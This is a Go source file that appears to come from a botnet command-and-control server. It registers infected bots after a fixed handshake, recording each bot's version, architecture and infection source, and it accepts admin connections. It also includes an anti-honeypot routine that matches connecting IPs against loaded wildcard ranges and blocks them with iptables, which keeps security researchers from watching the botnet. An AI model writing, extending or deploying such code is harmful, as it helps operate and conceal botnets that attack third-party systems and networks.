package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"
)

type IPPattern struct {
	parts [4]interface{}
}

var (
	honeypotPatterns []IPPattern
	honeypotMutex    sync.RWMutex
)

func botConnectionHandler(conn net.Conn) {
	defer conn.Close()

	if config.AntiHoneypot && checkAndBlockHoneypot(conn) {
		return
	}

	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	handshakeBuf := make([]byte, 4)
	l, err := conn.Read(handshakeBuf)
	if err != nil || l != 4 || !(handshakeBuf[0] == 0x00 && handshakeBuf[1] == 0x00 && handshakeBuf[2] == 0x00 && handshakeBuf[3] == 0x00) {
		return
	}

	versionLenBuf := make([]byte, 1)
	l, err = conn.Read(versionLenBuf)
	if err != nil || l <= 0 {
		return
	}
	versionLen := int(versionLenBuf[0])
	var version string
	if versionLen > 0 {
		versionBuf := make([]byte, versionLen)
		l, err = conn.Read(versionBuf)
		if err != nil || l <= 0 {
			return
		}
		version = string(versionBuf)
	}

	archLenBuf := make([]byte, 1)
	l, err = conn.Read(archLenBuf)
	if err != nil || l <= 0 {
		return
	}
	archLen := int(archLenBuf[0])
	var arch string
	if archLen > 0 {
		archBuf := make([]byte, archLen)
		l, err = conn.Read(archBuf)
		if err != nil || l <= 0 {
			return
		}
		arch = string(archBuf)
	}

	sourceLenBuf := make([]byte, 1)
	l, err = conn.Read(sourceLenBuf)
	if err != nil || l <= 0 {
		return
	}
	sourceLen := int(sourceLenBuf[0])
	var source string
	if sourceLen > 0 {
		sourceBuf := make([]byte, sourceLen)
		l, err = conn.Read(sourceBuf)
		if err != nil || l <= 0 {
			return
		}
		source = string(sourceBuf)
	}

	NewBot(conn, version, arch, source).Handle()
}

func adminConnectionHandler(conn net.Conn) {
	NewAdmin(conn).Handle()
}

func checkAndBlockHoneypot(conn net.Conn) bool {
	remoteAddr, ok := conn.RemoteAddr().(*net.TCPAddr)
	if !ok {
		return false
	}

	ip := remoteAddr.IP
	if ipv4 := ip.To4(); ipv4 != nil {
		honeypotMutex.RLock()
		defer honeypotMutex.RUnlock()

		for _, pattern := range honeypotPatterns {
			if pattern.Match(ipv4) {
				patternStr := pattern.ToString()
				ipStr := conn.RemoteAddr().String()

				fmt.Printf("\x1b[38;5;231m[ \x1b[38;5;63mHoneypot detected \x1b[38;5;231m] \x1b[38;5;231mIP \x1b[38;5;231m: \x1b[38;5;231m%s \x1b[38;5;231m| Pattern \x1b[38;5;231m: \x1b[38;5;231m%s\n", ipStr, patternStr)

				LogHoneypotDetection(ipStr, patternStr)

				ipOnly := strings.Split(ipStr, ":")[0]
				cmd := exec.Command("sudo", "iptables", "-A", "INPUT", "-s", ipOnly, "-j", "DROP")
				if err := cmd.Run(); err != nil {
					ErrorLogger.Printf("Failed to block IP %s: %v", ipOnly, err)
				} else {
					fmt.Printf("\x1b[38;5;231m[ \x1b[38;5;195mBlocked honeypot \x1b[38;5;231m] \x1b[38;5;231mIP \x1b[38;5;231m: \x1b[38;5;231m%s \x1b[38;5;231m| Pattern \x1b[38;5;231m: \x1b[38;5;231m%s\n", ipStr, patternStr)
				}
				return true
			}
		}
	}
	return false
}

func loadHoneypotPatterns(filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	var ranges []string
	if err := json.NewDecoder(file).Decode(&ranges); err != nil {
		return err
	}

	var patterns []IPPattern
	for _, s := range ranges {
		pattern, err := parsePattern(s)
		if err != nil {
			continue
		}
		patterns = append(patterns, pattern)
	}

	honeypotMutex.Lock()
	honeypotPatterns = patterns
	honeypotMutex.Unlock()

	return nil
}

func parsePattern(s string) (IPPattern, error) {
	parts := strings.Split(s, ".")
	var pattern [4]interface{}

	for i := 0; i < 4; i++ {
		if i < len(parts) {
			if parts[i] == "*" {
				pattern[i] = nil
			} else {
				num, err := strconv.Atoi(parts[i])
				if err != nil || num < 0 || num > 255 {
					return IPPattern{}, errors.New("invalid pattern")
				}
				pattern[i] = byte(num)
			}
		} else {
			pattern[i] = nil
		}
	}
	return IPPattern{parts: pattern}, nil
}

func (p *IPPattern) Match(ip net.IP) bool {
	ip = ip.To4()
	if ip == nil {
		return false
	}
	for i := 0; i < 4; i++ {
		if p.parts[i] != nil && p.parts[i].(byte) != ip[i] {
			return false
		}
	}
	return true
}

func (p *IPPattern) ToString() string {
	parts := make([]string, 4)
	for i, part := range p.parts {
		if part == nil {
			parts[i] = "*"
		} else {
			parts[i] = fmt.Sprintf("%d", part.(byte))
		}
	}
	return strings.Join(parts, ".")
}
